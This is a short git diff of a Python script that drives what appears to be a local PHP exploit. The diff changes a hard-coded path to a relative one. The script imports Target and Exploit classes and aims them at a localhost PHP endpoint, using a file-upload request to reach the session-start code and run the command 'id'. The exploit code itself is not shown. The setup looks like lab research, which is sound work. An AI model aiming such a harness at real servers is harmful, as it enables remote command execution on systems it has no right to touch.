@@ -1,7 +1,8 @@
 #!/usr/bin/env python3
 """reqB WITH a file part (to trigger FILE_START -> php_rinit_session -> active session)."""
+import os
 import sys, time, struct, re
-sys.path.insert(0, r"C:\Users\likat\p2s52704")
+sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
 from exploit import Target, Exploit, build_multipart
 t = Target("http://127.0.0.1:18111/index.php", timeout=90.0, verbose=False)
 ex = Exploit(t, "id", profile="bookworm")
